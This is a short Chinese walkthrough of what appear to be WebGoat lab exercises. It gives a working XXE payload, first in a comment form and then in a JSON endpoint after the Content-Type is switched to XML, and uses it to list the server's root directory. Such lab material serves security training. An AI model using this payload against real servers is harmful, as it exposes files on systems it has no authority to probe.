题目要求

在此作业中，您将向照片添加评论，提交表单时尝试使用评论字段执行 XXE 注入。 尝试列出文件系统的根目录。

随意评论并抓包


在数据包中添加

<?xml version="1.0"?> <!DOCTYPE xxe [<!ELEMENT name ANY><!ENTITY xxe SYSTEM "file:///">]><comment> <text>&xxe;</text></comment>



放包，就可以看到根目录了，并且显示我们已经完成

题目要求

在现代 REST 框架中，服务器可能能够接受您作为开发人员没有考虑过的数据格式。 因此，这可能会导致 JSON 端点容易受到 XXE 攻击。 

同样的练习，但尝试执行与我们在第一次分配中所做的相同的 XML 注入。

随意输入并抓包




修改content-type为application/xml,并添加xml数据

<?xml version="1.0"?> <!DOCTYPE xxe [<!ELEMENT name ANY><!ENTITY xxe SYSTEM "file:///">]><comment> <text>&xxe;</text></comment>


成功看到根目录
